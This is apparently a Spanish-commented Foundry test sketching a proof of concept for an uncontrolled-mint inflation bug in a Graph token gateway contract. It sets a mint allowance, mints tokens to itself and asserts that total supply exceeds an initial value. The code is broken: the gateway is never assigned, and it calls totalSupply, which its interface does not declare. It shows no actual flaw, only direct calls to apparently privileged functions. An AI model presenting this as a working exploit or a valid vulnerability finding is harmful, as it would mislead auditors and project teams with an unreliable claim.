// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// Interfaz mínima del contrato vulnerable para la PoC
interface IL1GraphTokenGateway {
    function mint(address _to, uint256 _amount) external;
    function setL2MintAllowance(uint256 _allowance) external;
}

contract InflationPoC is Test {
    IL1GraphTokenGateway public gateway;
    
    function setUp() public {
        // Aquí desplegaremos o haremos un etch del contrato vulnerable
        // gateway = IL1GraphTokenGateway(0x...); 
    }

    function testInflationVulnerability() public {
        uint256 initialSupply = 10000000000;
        
        // Simular el error de desincronización que detectaste
        gateway.setL2MintAllowance(9999999999);
        
        // Ejecutar el mint descontrolado
        gateway.mint(address(this), 5000000000);
        
        // Assert: El suministro final debe ser superior al esperado
        assertGt(gateway.totalSupply(), initialSupply);
    }
}
